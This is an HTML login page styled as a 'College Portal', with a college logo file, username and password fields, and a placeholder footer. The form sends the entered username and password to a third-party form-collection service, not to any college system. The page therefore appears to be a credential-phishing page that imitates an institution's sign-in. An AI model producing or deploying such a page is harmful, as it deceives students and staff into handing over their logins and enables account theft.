<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>College Portal</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    background:linear-gradient(135deg,#0d47a1,#42a5f5);
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.login-box{
    background:#fff;
    width:360px;
    padding:30px;
    border-radius:12px;
    box-shadow:0 8px 20px rgba(0,0,0,0.2);
    text-align:center;
}

.login-box img{
    width:90px;
    margin-bottom:15px;
}

h2{
    margin-bottom:20px;
    color:#333;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:6px;
    font-size:15px;
}

button{
    width:100%;
    padding:12px;
    background:#1565c0;
    color:white;
    border:none;
    border-radius:6px;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    background:#0d47a1;
}

.footer{
    margin-top:15px;
    color:#666;
    font-size:14px;
}
</style>
</head>

<body>

<div class="login-box">

    <img src="logo_apec.png" alt="College Logo">

    <h2>College Portal</h2>

 

<form action="https://forminit.com/f/nohsxqo02s2" method="POST">

  <input type="text" name="fi-sender-fullName" placeholder="Username" required>

  <input type="text" name="fi-text-password" placeholder="Password" required>

  <button type="submit">Login</button>

</form>
        
    

    <div class="footer">
        © 2026 Your College Name
    </div>

</div>

</body>
</html>
